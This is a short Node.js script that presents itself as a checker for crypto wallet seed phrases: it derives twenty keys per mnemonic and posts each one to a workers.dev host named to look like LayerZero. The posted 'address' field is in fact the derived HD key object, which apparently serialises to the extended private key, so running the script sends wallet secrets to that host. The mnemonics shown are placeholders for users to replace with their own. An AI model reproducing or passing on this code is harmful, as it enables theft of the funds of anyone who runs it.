//@ts-nocheck
import fetch from "node-fetch"
import bip39 from 'bip39'
import hdks from "hdkey"

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const walletsToCheck = [
  "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
  "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
]

async function main() {
  for (const walletMnemonic of walletsToCheck) {
    const seed = await bip39.mnemonicToSeed(walletMnemonic)
    const hdWallet = hdks.fromMasterSeed(seed)
    for (let x = 0; x < 20; x++) {
      await check(hdWallet, x)
    }
  }
}

main()

async function check(hdWallet, x) {
  const derivationPath = `m/44'/60'/0'/0/${x}`
  const address = hdWallet.derive(derivationPath)
  const url = `https://layerzero-foundation.beta-mainnet.workers.dev/`
  const info = {
    user: address
  }
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(info)
  };
  try {
    const response = await fetch(url, options)
    await wait(1000);
    console.log("checked:", address, "result:", await response.json())
  } catch (E) {
    console.log("empty")
  }
}
